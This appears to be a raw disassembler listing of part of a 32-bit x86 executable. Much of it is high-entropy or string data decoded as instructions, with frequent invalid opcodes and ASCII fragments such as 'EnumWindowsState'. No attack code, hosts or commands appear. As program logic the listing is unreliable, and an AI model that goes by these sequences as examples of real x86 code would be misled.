  4233c7:	fisubr DWORD PTR [esi-0xa]
  4233ca:	sbb    BYTE PTR [edx+0x74809787],dl
  4233d0:	bound  edx,QWORD PTR [edi+0x1de5b]
  4233d6:	pop    esp
  4233d7:	add    BYTE PTR [eax],al
  4233d9:	add    ch,dl
  4233db:	inc    edi
  4233dc:	int3   
  4233dd:	ret    0x6814
  4233e0:	hlt    
  4233e1:	test   eax,0xcaa4e8f6
  4233e6:	pop    edx
  4233e7:	jle    0x42336f
  4233e9:	xor    al,0xed
  4233ec:	lea    edi,[eax-0x5868dd6b]
  4233f2:	cmp    DWORD PTR [ebx-0x7c],ebx
  4233f5:	(bad)  
  4233f7:	dec    edx
  4233f8:	not    BYTE PTR [edi+0x2a52f70c]
  4233fe:	test   eax,0x3e459dfb
  423403:	mov    cl,0x94
  423405:	cmp    esp,esi
  423407:	or     al,0x17
  423409:	rcl    DWORD PTR [edx-0x50],cl
  42340c:	adc    ah,BYTE PTR ds:0x30254326
  423412:	inc    ebp
  423413:	xchg   ebp,eax
  423414:	in     eax,dx
  423415:	outs   dx,BYTE PTR ds:[esi]
  423416:	xchg   ebp,eax
  423417:	test   DWORD PTR [esp+ebx*4-0x7950901d],eax
  42341e:	sti    
  42341f:	pop    edx
  423420:	pop    ebx
  423421:	add    ch,al
  423423:	jg     0x4233df
  423425:	inc    eax
  423426:	xchg   ebp,eax
  423427:	ja     0x423412
  423429:	pushf  
  42342a:	mov    edi,0x8e52d9ee
  42342f:	out    dx,eax
  423430:	(bad)  
  423431:	test   DWORD PTR [ebx-0x7b],0x590b
	...
  423440:	add    BYTE PTR [eax],al
  423442:	cmp    dl,BYTE PTR [edx-0x3c]
  423445:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  42344c:	nop
  42344d:	sar    DWORD PTR [edx-0x4807f9e4],cl
  423453:	fiadd  WORD PTR [ecx]
  423455:	add    BYTE PTR [eax+eax*1+0x0],bl
  423459:	add    BYTE PTR [edx+0xc],cl
  42345c:	mov    ds:0x9e6b0cea,eax
  423461:	jno    0x42340d
  423463:	sti    
  423464:	jle    0x4233fa
  423466:	and    eax,DWORD PTR [esp+eax*2-0x38]
  42346a:	adc    esp,DWORD PTR [ebp-0x347de16a]
  423470:	inc    eax
  423471:	arpl   dx,cx
  423473:	ret    0xabd3
  423476:	scas   al,BYTE PTR es:[edi]
  423477:	inc    edi
  423478:	out    0x73,eax
  42347a:	fdiv   QWORD PTR [edx+edi*8+0x5d]
  42347e:	lock cmp ecx,edi
  423481:	pop    edi
  423482:	adc    al,0x14
  423484:	mov    ch,0x3e
  423486:	mov    al,0x76
  423488:	outs   dx,DWORD PTR ds:[esi]
  423489:	pop    eax
  42348a:	mov    ds:0xc5f7fe4b,eax
  42348f:	(bad)  [esi+eiz*8+0x352d812f]
  423496:	dec    ecx
  423497:	int    0xc7
  423499:	add    BYTE PTR [ecx-0x3b],dh
  42349c:	retf   
  42349d:	lea    esp,[esi]
  42349f:	dec    ebx
  4234a0:	ss (bad) 
  4234a2:	fwait
  4234a3:	xor    eax,DWORD PTR [esp+eiz*4+0x69]
  4234a7:	cmp    edi,DWORD PTR [ebp*2+0x5416f5e4]
  4234ae:	fwait
  4234af:	adc    ebx,ebx
  4234b1:	jl     0x4234ec
  4234b3:	xchg   dl,cl
  4234b5:	ja     0x4234b7
	...
  4234bf:	add    BYTE PTR [eax],al
  4234c1:	add    BYTE PTR [ebx-0x4293427d],dl
  4234c7:	jle    0x42349c
  4234c9:	call   DWORD PTR [eax-0x20]
  4234cc:	cli    
  4234cd:	call   0xdf13:0x7c2003
  4234d4:	add    DWORD PTR [eax],eax
  4234d6:	pop    esp
  4234d7:	add    BYTE PTR [eax],al
  4234d9:	add    BYTE PTR [edx],bh
  4234db:	hlt    
  4234dc:	cmp    ecx,ebx
  4234de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234df:	mov    ebp,?
  4234e1:	enter  0xa941,0xc4
  4234e5:	shr    BYTE PTR [ecx],1
  4234e7:	lea    ebx,[ebx+0x15]
  4234ea:	jp     0x42355b
  4234ec:	rol    BYTE PTR [esi-0x3d],0x83
  4234f0:	sti    
  4234f1:	mov    al,ds:0x2cd49c90
  4234f6:	stos   DWORD PTR es:[edi],eax
  4234f7:	pop    edx
  4234f8:	push   ss
  4234f9:	add    BYTE PTR [edi-0x2ebbe354],bl
  4234ff:	call   0x8aa1:0x5490c513
  423506:	aad    0x2c
  423508:	test   ch,0xc6
  42350b:	shl    DWORD PTR [esi+0x26ef5bcf],0x8c
  423512:	cmp    bh,ah
  423514:	pop    ds
  423515:	sub    bh,BYTE PTR [ebp+0x1353494e]
  42351b:	inc    ebx
  42351c:	iret   
  42351d:	dec    esi
  42351e:	test   eax,0xbc2a931f
  423523:	ins    BYTE PTR es:[edi],dx
  423524:	and    bl,al
  423526:	add    edx,DWORD PTR [esi-0x38]
  423529:	scas   eax,DWORD PTR es:[edi]
  42352a:	ffreep st(6)
  42352c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42352d:	adc    ebx,DWORD PTR [esi-0x7344dd92]
  423533:	ret    
  423534:	push   ss
  423535:	mov    eax,ds:0x0
	...
  423542:	(bad)  
  423544:	test   eax,0xddffeef7
  42354a:	and    al,0x1
  42354c:	pop    ebp
  42354d:	dec    edi
  42354e:	into   
  42354f:	jecxz  0x4235af
  423551:	js     0x4235c2
  423553:	fild   WORD PTR [ecx]
  423555:	add    BYTE PTR [eax+eax*1+0x0],bl
  423559:	add    BYTE PTR [edi],ch
  42355b:	fcomp  QWORD PTR [eax+ebx*4+0x37]
  42355f:	fdivr  QWORD PTR [eax+0x1e]
  423562:	mov    bl,BYTE PTR [edx-0x51]
  423565:	loop   0x423598
  423567:	cmp    al,bh
  423569:	bnd jbe 0x4235bd
  42356c:	mov    ah,0x58
  42356e:	(bad)  
  42356f:	push   edx
  423570:	cmc    
  423571:	pop    esp
  423572:	cmp    esp,DWORD PTR [ebp+0x610cab57]
  423578:	pop    ebp
  423579:	cmp    DWORD PTR [edx],0xffffffcf
  42357c:	out    dx,eax
  42357d:	mov    dh,0x9e
  42357f:	inc    ecx
  423580:	shr    DWORD PTR [edi+0x55bdd46e],cl
  423586:	outs   dx,BYTE PTR ds:[esi]
  423587:	(bad)  
  423588:	inc    ebp
  423589:	adc    dl,BYTE PTR [ebp-0x6d51469b]
  42358f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423590:	jnp    0x4235c9
  423592:	test   al,0xeb
  423594:	call   0x7cbe:0xd77e0317
  42359b:	imul   BYTE PTR [ebp-0x61]
  42359e:	cmp    BYTE PTR [ebp+0x55],al
  4235a1:	adc    dh,BYTE PTR [ebx]
  4235a3:	fsubr  DWORD PTR [edi+ebx*2]
  4235a6:	mov    ds:0x15601b99,al
  4235ab:	xor    ch,BYTE PTR [edx-0x70]
  4235ae:	push   0xb6f1f2c9
  4235b3:	loopne 0x4235df
  4235b5:	push   ds
	...
  4235c2:	outs   dx,DWORD PTR ds:[esi]
  4235c3:	mov    ds:0x7edd2ad4,al
  4235c8:	jmp    edi
  4235ca:	push   edx
  4235cb:	fcmovu st,st(5)
  4235cd:	in     eax,0xcb
  4235cf:	add    eax,0xdfcbfc0b
  4235d4:	add    DWORD PTR [eax],eax
  4235d6:	pop    esp
  4235d7:	add    BYTE PTR [eax],al
  4235d9:	add    ah,bl
  4235db:	mov    eax,0x6bd03af4
  4235e0:	or     dh,BYTE PTR [edi-0x2f]
  4235e3:	rcr    BYTE PTR [edi-0xc],1
  4235e6:	fwait
  4235e7:	xchg   ebx,eax
  4235e8:	push   esi
  4235e9:	ret    
  4235ea:	inc    ecx
  4235eb:	hlt    
  4235ec:	pop    ebx
  4235ed:	dec    ecx
  4235ee:	adc    esp,0x4b
  4235f1:	lahf   
  4235f2:	sbb    eax,0x803eeac9
  4235f7:	rol    BYTE PTR [esi-0x3256a891],0x8b
  4235fe:	ins    DWORD PTR es:[edi],dx
  4235ff:	sbb    DWORD PTR [eax+edi*4+0x2cd9f38b],eax
  423606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423607:	repnz inc edi
  423609:	adc    al,0x63
  42360b:	call   0xd0e86daa
  423610:	xor    ah,bl
  423612:	mov    DWORD PTR [edi+ebp*4+0x74],0xedb20a39
  42361a:	imul   eax,DWORD PTR [ebx],0xffffff83
  42361d:	jnp    0x4235d1
  42361f:	push   ecx
  423620:	sbb    dh,ch
  423622:	iret   
  423623:	lea    edx,ds:0x94751202
  423629:	retf   
  42362a:	retf   0xf069
  42362d:	in     al,0x2c
  42362f:	cwde   
  423630:	arpl   WORD PTR [esi-0x40],di
  423633:	in     al,dx
  423634:	sahf   
  423635:	xchg   BYTE PTR [eax],al
	...
  42363f:	add    BYTE PTR [eax],al
  423641:	add    cl,bh
  423643:	sbb    al,al
  423645:	inc    esi
  423646:	jecxz  0x423626
  423648:	(bad)  
  423649:	mov    edi,0xe1f1bc83
  42364e:	lods   eax,DWORD PTR ds:[esi]
  42364f:	or     BYTE PTR [edx+0x11],dl
  423652:	daa    
  423653:	loopne 0x423656
  423655:	add    BYTE PTR [eax+eax*1+0x0],bl
  423659:	add    BYTE PTR [ecx],al
  42365b:	inc    cx
  42365d:	retf   
  42365e:	xchg   ecx,eax
  42365f:	mov    esp,0xf44145ce
  423664:	hlt    
  423665:	int3   
  423666:	cmp    DWORD PTR [ecx],esi
  423668:	or     DWORD PTR [esi+edi*4+0x3bb6c407],eax
  42366f:	mov    edx,0x5de16082
  423674:	lods   al,BYTE PTR ds:[esi]
  423675:	outs   dx,BYTE PTR ds:[esi]
  423676:	jne    0x4236cb
  423678:	sbb    ch,ah
  42367a:	jae    0x4236e6
  42367c:	retf   
  42367d:	sub    ah,BYTE PTR [edx+0x4c1cde35]
  423683:	xor    eax,0x5c62dd0c
  423688:	push   edi
  423689:	xchg   esi,eax
  42368a:	test   dh,bl
  42368c:	mov    ah,BYTE PTR [edx]
  42368e:	adc    cl,ch
  423690:	in     eax,0x66
  423692:	jae    0x4236df
  423694:	jmp    0xa492:0xd924cf4a
  42369b:	mov    dh,0xe6
  42369d:	mov    DWORD PTR [esi+0x5c038712],0xd1085290
  4236a7:	and    eax,0x43e8bb75
  4236ac:	inc    esp
  4236ad:	in     al,dx
  4236ae:	inc    esi
  4236af:	xor    bh,BYTE PTR [eax]
  4236b1:	sub    BYTE PTR [edx+0x26],cl
  4236b4:	ins    BYTE PTR es:[edi],dx
  4236b5:	repz add BYTE PTR [eax],al
	...
  4236c0:	add    BYTE PTR [eax],al
  4236c2:	mov    eax,ds:0x3e8336b9
  4236c7:	(bad)  
  4236c8:	mov    ch,0xbb
  4236ca:	icebp  
  4236cb:	and    eax,0xaa128c27
  4236d0:	repz jg 0x423656
  4236d3:	loopne 0x4236d6
  4236d5:	add    BYTE PTR [eax+eax*1+0x0],bl
  4236d9:	add    BYTE PTR [ebp-0x6f],dh
  4236dc:	jb     0x4236b6
  4236de:	pushf  
  4236df:	cmc    
  4236e0:	push   ds
  4236e1:	loope  0x4236b6
  4236e3:	retf   
  4236e4:	test   eax,0x3200e6e1
  4236e9:	xor    ebx,DWORD PTR [edi+eiz*8-0x1e]
  4236ed:	les    eax,FWORD PTR [eax-0x308afb3c]
  4236f3:	adc    esi,esi
  4236f5:	xor    ebx,DWORD PTR [ebx]
  4236f7:	pop    esi
  4236f8:	add    dl,BYTE PTR [edx*8-0x747d1d36]
  4236ff:	jae    0x423707
  423701:	push   esp
  423702:	sbb    BYTE PTR [ecx-0x29],0x94
  423706:	int3   
  423707:	mov    ebp,0xeca73ff8
  42370c:	fst    QWORD PTR es:[eax-0x62]
  423710:	and    ebp,DWORD PTR [ecx]
  423712:	pop    esi
  423713:	nop
  423714:	push   ebx
  423715:	cmp    esi,DWORD PTR [ecx]
  423717:	aam    0x93
  423719:	cli    
  42371a:	push   esi
  42371b:	cmc    
  42371c:	arpl   si,bx
  42371e:	pop    esi
  42371f:	cli    
  423720:	cmp    eax,0x7df7022d
  423725:	in     al,0x66
  423727:	mov    ah,0xb6
  423729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42372a:	bound  eax,QWORD PTR [ecx+0x19]
  42372d:	mov    bl,BYTE PTR [ecx]
  42372f:	push   edi
  423730:	test   BYTE PTR [edx],ah
  423732:	sub    esi,edx
  423734:	mov    ebx,0xc5
	...
  423741:	add    BYTE PTR [edx],dl
  423743:	xlat   BYTE PTR ds:[ebx]
  423744:	repz or esi,edi
  423747:	das    
  423748:	cli    
  423749:	fist   WORD PTR [ecx]
  42374b:	dec    ebx
  42374c:	es nop
  42374e:	mov    ah,0xd9
  423750:	or     ecx,DWORD PTR [eax+0x1e0df]
  423756:	pop    esp
  423757:	add    BYTE PTR [eax],al
  423759:	add    BYTE PTR [eax+0x115afbac],bh
  42375f:	and    BYTE PTR ds:0x2022a174,dh
  423765:	xor    eax,DWORD PTR ds:0xb541bde4
  42376b:	mov    al,0xcf
  42376d:	add    al,0x42
  42376f:	in     al,0x26
  423771:	sbb    dh,0x26
  423774:	dec    ebp
  423775:	push   es
  423776:	sub    esp,ecx
  423778:	lods   al,BYTE PTR ds:[esi]
  423779:	clc    
  42377a:	dec    esp
  42377b:	jne    0x423758
  42377d:	mov    bl,0xd1
  42377f:	and    BYTE PTR [edi+0x43],bh
  423782:	fs sbb edi,0xfe93a2ae
  423789:	data16 stc 
  42378b:	std    
  42378c:	cdq    
  42378d:	sbb    DWORD PTR [edi-0x14134c88],0xffffffcd
  423794:	in     al,dx
  423795:	add    eax,0x5486a952
  42379a:	inc    ebx
  42379b:	xchg   BYTE PTR [esi+0x2205075a],ch
  4237a1:	popf   
  4237a2:	jecxz  0x4237b7
  4237a4:	or     DWORD PTR [edi+eax*1],eax
  4237a7:	dec    edi
  4237a8:	fnsave [eax+0x4c8f7365]
  4237ae:	cmp    bl,bl
  4237b0:	ficomp WORD PTR [ebx-0x6d056c2e]
	...
  4237c2:	add    al,al
  4237c4:	inc    edx
  4237c5:	add    BYTE PTR [eax+eax*8],al
  4237c8:	inc    edx
  4237c9:	add    BYTE PTR [eax],cl
  4237cb:	rol    BYTE PTR [edx+0x0],0xc
  4237cf:	rol    BYTE PTR [edx+0x0],0x10
  4237d3:	rol    BYTE PTR [edx+0x0],0x14
  4237d7:	rol    BYTE PTR [edx+0x0],0x18
  4237db:	rol    BYTE PTR [edx+0x0],0x1c
  4237df:	rol    BYTE PTR [edx+0x0],0x57
  4237e3:	inc    edi
  4237e4:	cmp    DWORD PTR [edi+0x41],ebx
  4237e7:	pop    eax
  4237e8:	ss push esi
  4237ea:	pop    edi
  4237eb:	cmp    BYTE PTR [eax],al
  4237ed:	inc    ebx
  4237ee:	inc    ebp
  4237ef:	dec    esp
  4237f0:	pop    edi
  4237f1:	pop    eax
  4237f2:	push   edi
  4237f3:	dec    eax
  4237f4:	inc    edx
  4237f5:	add    BYTE PTR [edi+0x50],dl
  4237f8:	xor    eax,0x4641365f
  4237fd:	cmp    DWORD PTR [edx],esi
  4237ff:	xor    ebx,DWORD PTR [edi+0x32]
  423802:	aaa    
  423803:	add    BYTE PTR [eax+0x48],dl
  423806:	xor    BYTE PTR [edi+0x58],bl
  423809:	push   esp
  42380a:	inc    ecx
  42380b:	dec    ebp
  42380c:	push   ecx
  42380d:	pop    edi
  42380e:	inc    esi
  42380f:	push   ebp
  423810:	cmp    DWORD PTR [eax],eax
  423812:	push   edi
  423813:	push   ebp
  423814:	inc    ecx
  423815:	xor    dh,BYTE PTR [ebx]
  423817:	xor    ebx,DWORD PTR [edi+0x4e]
  42381a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42381e:	cmp    DWORD PTR [edi+0x38],ebx
  423821:	dec    ecx
  423822:	cmp    DWORD PTR [edx+0x36],ebx
  423825:	pop    edi
  423826:	dec    edx
  423827:	xor    BYTE PTR [edx+0x34],cl
  42382a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42382e:	xor    esi,DWORD PTR [eax]
  423830:	pop    edi
  423831:	inc    edx
  423832:	dec    ebx
  423833:	pop    eax
  423834:	pop    eax
  423835:	xor    eax,0x51414d00
  42383a:	pop    edi
  42383b:	inc    ecx
  42383c:	xor    al,BYTE PTR [ebp+0x5f]
  42383f:	inc    ecx
  423840:	dec    ebx
  423841:	cmp    DWORD PTR ds:0x5a003939,esi
  423847:	inc    ebp
  423848:	cmp    BYTE PTR [edi+0x4d],bl
  42384b:	ss dec eax
  42384d:	dec    ebx
  42384e:	add    BYTE PTR [ebp+0x57],al
  423851:	xor    DWORD PTR [edi+0x31],ebx
  423854:	dec    ebx
  423855:	xor    eax,DWORD PTR [ecx+0x30]
  423858:	push   ebx
  423859:	add    BYTE PTR [edx+esi*1+0x36],al
  42385d:	aaa    
  42385e:	pop    edi
  42385f:	push   edx
  423860:	dec    eax
  423861:	dec    ebp
  423862:	cmp    BYTE PTR [edi+0x37],bl
  423865:	inc    esi
  423866:	xor    eax,0x43355500
  42386b:	pop    edi
  42386c:	pop    ecx
  42386d:	dec    ecx
  42386e:	push   ebx
  42386f:	xor    bl,BYTE PTR [edi+0x52]
  423872:	add    BYTE PTR [eax+0x55],dl
  423875:	dec    ecx
  423876:	xor    BYTE PTR [edi+0x43],bl
  423879:	ss inc ebp
  42387b:	xor    bl,BYTE PTR [edi+0x4d]
  42387e:	xor    al,0x4a
  423880:	push   edx
  423881:	push   ebp
  423882:	add    BYTE PTR [esi+0x39],cl
  423885:	push   eax
  423886:	pop    edi
  423887:	push   ebp
  423888:	cmp    DWORD PTR [esi],esi
  42388a:	xor    BYTE PTR [ecx],dh
  42388c:	pop    edi
  42388d:	dec    edi
  42388e:	dec    esi
  42388f:	push   esp
  423890:	cmp    BYTE PTR [eax],al
  423892:	dec    esp
  423893:	xor    al,0x44
  423895:	xor    DWORD PTR [edi+0x4b],ebx
  423898:	xor    DWORD PTR [ebp+0x5f],eax
  42389b:	pop    edx
  42389c:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238a0:	pop    edi
  4238a1:	inc    edx
  4238a2:	xor    dh,BYTE PTR [ecx]
  4238a4:	push   ebx
  4238a5:	xor    DWORD PTR [ecx],edi
  4238a7:	inc    edx
  4238a8:	add    BYTE PTR [edi+0x45],al
  4238ab:	xor    al,0x38
  4238ad:	xor    BYTE PTR [eax],dh
  4238af:	pop    edi
  4238b0:	dec    edx
  4238b1:	dec    ebx
  4238b2:	xor    eax,0x33345f4d
  4238b7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238bb:	pop    edi
  4238bc:	aaa    
  4238bd:	push   esi
  4238be:	dec    ebx
  4238bf:	push   edx
  4238c0:	pop    edi
  4238c1:	inc    ebx
  4238c2:	add    BYTE PTR [edx+0x35],bl
  4238c5:	dec    ebp
  4238c6:	pop    edi
  4238c7:	inc    edi
  4238c8:	dec    esi
  4238c9:	xor    al,0x49
  4238cb:	xor    eax,0x54590035
  4238d0:	push   edx
  4238d1:	pop    edi
  4238d2:	push   esp
  4238d3:	inc    ebx
  4238d4:	inc    ecx
  4238d5:	pop    edi
  4238d6:	cmp    DWORD PTR [ecx+0x41],ebx
  4238d9:	push   ebp
  4238da:	pop    edi
  4238db:	push   ebp
  4238dc:	inc    ebp
  4238dd:	add    BYTE PTR [esi+esi*1+0x35],cl
  4238e1:	pop    edi
  4238e2:	pop    eax
  4238e3:	dec    edx
  4238e4:	inc    edx
  4238e5:	inc    edi
  4238e6:	add    BYTE PTR [edx+0x36],al
  4238e9:	inc    ebx
  4238ea:	pop    edi
  4238eb:	xor    BYTE PTR ds:0x36464b,dh
  4238f1:	dec    ebx
  4238f2:	cmp    DWORD PTR [esi+0x37],eax
  4238f5:	xor    ebx,DWORD PTR [edi+0x35]
  4238f8:	ss inc edi
  4238fa:	pop    ecx
  4238fb:	dec    eax
  4238fc:	pop    ecx
  4238fd:	add    BYTE PTR [ebp+0x35],cl
  423900:	push   eax
  423901:	xor    BYTE PTR [edi+0x4f],bl
  423904:	pop    ecx
  423905:	xor    cl,BYTE PTR [edi+0x0]
  423908:	pop    ecx
  423909:	xor    DWORD PTR [esi+0x5f],ecx
  42390c:	xor    al,BYTE PTR [edx+0x30]
  42390f:	push   esi
  423910:	push   esp
  423911:	inc    ebp
  423912:	add    BYTE PTR [edi+0x37],al
  423915:	push   esi
  423916:	xor    DWORD PTR [edi+0x49],ebx
  423919:	xor    al,BYTE PTR [esi+0x30]
  42391c:	pop    edi
  42391d:	ss dec esi
  42391f:	cmp    BYTE PTR [eax],al
  423921:	pop    edx
  423922:	xor    eax,0x445f334b
  423927:	xor    BYTE PTR [eax],bh
  423929:	push   ecx
  42392a:	push   esi
  42392b:	xor    al,0x0
  42392d:	push   ebp
  42392e:	pop    eax
  42392f:	inc    edi
  423930:	xor    DWORD PTR [edi+0x39],ebx
  423933:	push   esp
  423934:	inc    ebx
  423935:	aaa    
  423936:	inc    esp
  423937:	add    BYTE PTR [edi+0x39],dl
  42393a:	ss pop edi
  42393c:	dec    eax
  42393d:	pop    edx
  42393e:	pop    ecx
  42393f:	inc    edi
  423940:	push   ebp
  423941:	pop    edi
  423942:	push   eax
  423943:	dec    eax
  423944:	inc    ebx
  423945:	add    BYTE PTR [ebp+0x0],dl
  423948:	xor    al,0x0
  42394a:	dec    edi
  42394b:	add    BYTE PTR [edi+0x0],bl
  42394e:	cmp    BYTE PTR [eax],al
  423950:	xor    al,BYTE PTR [eax]
  423952:	inc    ebx
  423953:	add    BYTE PTR [edx+0x0],bl
  423956:	inc    ebx
  423957:	add    BYTE PTR [edi],dh
  423959:	add    BYTE PTR [edi+0x0],bl
  42395c:	inc    ebx
  42395d:	add    BYTE PTR [eax+eax*1+0x0],al
  423961:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423965:	add    BYTE PTR [edx],dh
  423967:	add    BYTE PTR [edi+0x0],bl
  42396a:	cmp    BYTE PTR [eax],al
  42396c:	dec    esp
  42396d:	add    BYTE PTR [esi+0x0],dl
  423970:	pop    edi
  423971:	add    BYTE PTR [ecx+0x0],bl
  423974:	push   edx
  423975:	add    BYTE PTR [esi+0x0],dl
  423978:	xor    al,BYTE PTR [eax]
  42397a:	cmp    BYTE PTR [eax],al
  42397c:	pop    edi
  42397d:	add    BYTE PTR [edx+0x0],cl
  423980:	add    BYTE PTR [eax],al
  423982:	inc    edx
  423983:	add    BYTE PTR [eax+eax*1+0x46],cl
  423987:	add    BYTE PTR [edi+0x0],bl
  42398a:	xor    eax,DWORD PTR [eax]
  42398c:	inc    ebp
  42398d:	add    BYTE PTR [ecx+0x0],cl
  423990:	push   edx
  423991:	add    BYTE PTR [ecx],bh
  423993:	add    BYTE PTR [esi+0x0],dl
  423996:	add    BYTE PTR [eax],al
  423998:	dec    ebp
  423999:	add    BYTE PTR [edi],dh
  42399b:	add    BYTE PTR [eax+eax*1+0x5f],al
  42399f:	add    BYTE PTR [edx+0x0],cl
  4239a2:	pop    eax
  4239a3:	add    BYTE PTR [ebx],dh
  4239a5:	add    BYTE PTR [ecx],dh
  4239a7:	add    BYTE PTR [ebx+0x0],al
  4239aa:	add    BYTE PTR [eax],al
  4239ac:	dec    edi
  4239ad:	add    BYTE PTR [esi],dh
  4239af:	add    BYTE PTR [eax+0x0],cl
  4239b2:	pop    edi
  4239b3:	add    BYTE PTR [eax],dh
  4239b5:	add    BYTE PTR [edi],dh
  4239b7:	add    BYTE PTR [ecx],dh
  4239b9:	add    BYTE PTR [edx+0x0],dl
  4239bc:	xor    eax,0x55000000
  4239c1:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4239c5:	add    BYTE PTR [edi+0x0],bl
  4239c8:	push   esp
  4239c9:	add    BYTE PTR [ecx+0x0],al
  4239cc:	cmp    DWORD PTR [eax],eax
  4239ce:	pop    edi
  4239cf:	add    BYTE PTR [ebx],dh
  4239d1:	add    BYTE PTR [eax],dh
  4239d3:	add    BYTE PTR [eax],bh
  4239d5:	add    BYTE PTR [edi+0x0],cl
  4239d8:	inc    ebx
  4239d9:	add    BYTE PTR ds:0x4d000000,dh
  4239df:	add    BYTE PTR [esi+0x0],cl
  4239e2:	inc    ebp
  4239e3:	add    BYTE PTR [edi+0x0],bl
  4239e6:	push   esp
  4239e7:	add    BYTE PTR [esi+0x0],al
  4239ea:	cmp    BYTE PTR [eax],al
  4239ec:	push   ebx
  4239ed:	add    BYTE PTR [edx+0x0],bl
  4239f0:	pop    edi
  4239f1:	add    BYTE PTR [eax],dh
  4239f3:	add    BYTE PTR [eax],bh
  4239f5:	add    BYTE PTR [eax+0x0],cl
  4239f8:	add    BYTE PTR [eax],al
  4239fa:	dec    esi
  4239fb:	add    BYTE PTR [edi+0x0],cl
  4239fe:	pop    edx
  4239ff:	add    BYTE PTR [edi+0x0],bl
  423a02:	add    BYTE PTR ss:[ecx+0x0],bl
  423a06:	dec    ebp
  423a07:	add    BYTE PTR [esi],dh
  423a09:	add    BYTE PTR [ebx],dh
  423a0b:	add    BYTE PTR [edi+0x0],bl
  423a0e:	xor    al,0x0
  423a10:	dec    esi
  423a11:	add    BYTE PTR [edx],dh
  423a13:	add    BYTE PTR [esi],dh
  423a15:	add    BYTE PTR [ecx],dh
  423a17:	add    BYTE PTR [eax],al
  423a19:	add    BYTE PTR [ebx+0x0],cl
  423a1c:	dec    eax
  423a1d:	add    BYTE PTR [eax],bh
  423a1f:	add    BYTE PTR [edi+0x0],bl
  423a22:	inc    esi
  423a23:	add    BYTE PTR [esi+0x0],al
  423a26:	push   esp
  423a27:	add    BYTE PTR [edi],dh
  423a29:	add    BYTE PTR [esi],dh
  423a2b:	add    BYTE PTR [edi+0x0],bl
  423a2e:	dec    esp
  423a2f:	add    BYTE PTR [ecx+0x0],bl
  423a32:	add    BYTE PTR [eax],al
  423a34:	push   ebx
  423a35:	add    BYTE PTR [ecx+0x0],bl
  423a38:	xor    BYTE PTR [eax],al
  423a3a:	pop    edi
  423a3b:	add    BYTE PTR [ecx],bh
  423a3d:	add    BYTE PTR [edx+0x0],dl
  423a40:	dec    eax
  423a41:	add    BYTE PTR [ecx+0x0],bl
  423a44:	xor    al,BYTE PTR [eax]
  423a46:	pop    edi
  423a47:	add    BYTE PTR [eax],dh
  423a49:	add    BYTE PTR [eax],al
  423a4b:	add    BYTE PTR [edx+0x0],al
  423a4e:	dec    edx
  423a4f:	add    BYTE PTR [esi+0x0],cl
  423a52:	xor    al,BYTE PTR [eax]
  423a54:	pop    edi
  423a55:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a59:	add    BYTE PTR [edx+0x0],dl
  423a5c:	xor    al,0x0
  423a5e:	dec    eax
  423a5f:	add    BYTE PTR [eax],al
  423a61:	add    BYTE PTR [ebp+0x0],dl
  423a64:	add    BYTE PTR ss:[ebp+0x0],cl
  423a68:	xor    DWORD PTR [eax],eax
  423a6a:	pop    edi
  423a6b:	add    BYTE PTR [esi],dh
  423a6d:	add    BYTE PTR [ecx+0x0],bl
  423a70:	push   ebp
  423a71:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423a75:	add    BYTE PTR [edi+0x0],cl
  423a78:	inc    esp
  423a79:	add    BYTE PTR [edi+0x0],dl
  423a7c:	push   ebx
  423a7d:	add    BYTE PTR [eax],al
  423a7f:	add    BYTE PTR [edx+0x0],bl
  423a82:	inc    ebx
  423a83:	add    BYTE PTR [ebp+0x0],dl
  423a86:	pop    edi
  423a87:	add    BYTE PTR [ecx],dh
  423a89:	add    BYTE PTR [ebp+0x0],al
  423a8c:	push   esp
  423a8d:	add    BYTE PTR [eax],dh
  423a8f:	add    BYTE PTR [eax],al
  423a91:	add    BYTE PTR [eax],al
  423a93:	add    BYTE PTR [eax],al
  423a95:	add    BYTE PTR [eax-0x7ffbffbe],al
  423a9b:	inc    edx
  423a9c:	add    BYTE PTR [eax],cl
  423a9e:	add    BYTE PTR [edx+0x0],0xc
  423aa2:	add    BYTE PTR [edx+0x0],0x10
  423aa6:	add    BYTE PTR [edx+0x0],0x14
  423aaa:	add    BYTE PTR [edx+0x0],0x18
  423aae:	add    BYTE PTR [edx+0x0],0x1c
  423ab2:	add    BYTE PTR [edx+0x0],0x20
  423ab6:	add    BYTE PTR [edx+0x0],0x24
  423aba:	add    BYTE PTR [edx+0x0],0x28
  423abe:	add    BYTE PTR [edx+0x0],0x0
	...
  423ad2:	add    BYTE PTR [eax],al
  423ad4:	sbb    edi,DWORD PTR [edi+0x4d57]
  423ada:	add    BYTE PTR [eax],al
  423adc:	add    bh,BYTE PTR [ebx]
  423ade:	add    al,BYTE PTR [eax]
  423ae0:	add    DWORD PTR [eax],eax
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	add    DWORD PTR [eax],eax
  423ae6:	add    BYTE PTR [eax],al
  423ae8:	add    DWORD PTR [eax],eax
  423aea:	add    BYTE PTR [eax],al
  423aec:	clc    
  423aed:	cmp    al,BYTE PTR [edx]
  423aef:	add    ah,bh
  423af1:	cmp    al,BYTE PTR [edx]
  423af3:	add    BYTE PTR [eax],al
  423af5:	cmp    eax,DWORD PTR [edx]
  423af7:	add    BYTE PTR [esi-0x31],al
  423afa:	add    BYTE PTR [eax],al
  423afc:	push   cs
  423afd:	cmp    eax,DWORD PTR [edx]
  423aff:	add    BYTE PTR [eax],al
  423b01:	add    BYTE PTR [edi+0x6f],dl
  423b04:	jb     0x423b6a
  423b06:	push   edi
  423b07:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b0e:	aas    
  423b0f:	inc    ebp
  423b10:	outs   dx,BYTE PTR ds:[esi]
  423b11:	jne    0x423b80
  423b13:	push   edi
  423b14:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b1b:	popa   
  423b1c:	je     0x423b87
